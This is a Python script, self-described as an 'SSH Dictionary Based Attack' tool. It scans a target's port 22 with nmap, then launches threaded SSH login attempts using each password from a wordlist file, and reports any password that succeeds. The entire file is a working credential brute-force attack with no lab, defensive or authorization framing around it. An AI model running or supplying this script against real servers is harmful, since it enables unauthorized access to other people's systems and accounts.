import threading
from threading import Thread
import time
import argparse
from pexpect import pxssh
import nmap

Found = False
Fails = 0

maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)

def nmapScan(tgtHost):
	nmapScan = nmap.PortScanner()
	nmapScan.scan(tgtHost, '22')
	state = nmapScan[tgtHost]['tcp'][22]['state']
	return state

def connect(host, user, password, release):
	global Found
	global Fails
	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print('\n===========================================================')
		print('\n[+] Password Found: {}\n'.format(password.decode('utf-8')))
		print('===========================================================\n')
		Found = True
		s.logout()
	except Exception as e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, False)
	finally:
		if release: 
			connection_lock.release()

def main():
	parser = argparse.ArgumentParser('SSH Dictionary Based Attack')
	parser.add_argument('host', type=str, help='Host IP address for the SSH server')
	parser.add_argument('user', type=str, help='Username for the SSH connection')
	parser.add_argument('passwordFile', type=str, help='Password file to be used as the dictionary')
	args = parser.parse_args()
	host = args.host
	user = args.user
	passwordFile = args.passwordFile

	global Found
	global Fails

	print('\n========================================')
	print('Welcome to SSH Dictionary Based Attack')
	print('========================================\n')
	
	print('[+] Checking SSH port state on {}'.format(host))
	if nmapScan(host) == 'open':
		print('[+] SSH port 22 open on {}'.format(host))
	else:
		print('[!] SSH port 22 closed on {}'.format(host))	
		print('[+] Exiting Application.\n')
		exit()

	print('[+] Loading Password File\n')
	
	try:
		fn = open(passwordFile, 'rb')
	except Exception as e:
		print(e)
		exit(1)
	
	for line in fn:
		if Found:
			# print('[*] Exiting Password Found')
			exit(0)
		elif Fails > 5:
			print('[!] Exiting: Too Many Socket Timeouts')
			exit(0)

		connection_lock.acquire()
		
		password = line.strip()
		print('[-] Testing Password With: {}'.format(password.decode('utf-8')))
		
		t = Thread(target=connect, args=(host, user, password, True))
		t.start()
	
	while (threading.active_count() > 1):
		if threading.active_count() == 1 and Found != True:
			print('\n===========================================')
			print('\nPassword Not Found In Password File.\n')
			print('===========================================\n')
			print('[*] Exiting Application')
			exit(0)
		elif threading.active_count() == 1 and Found == True:
			print('[*] Exiting Application.\n')

if __name__ == '__main__':
	main()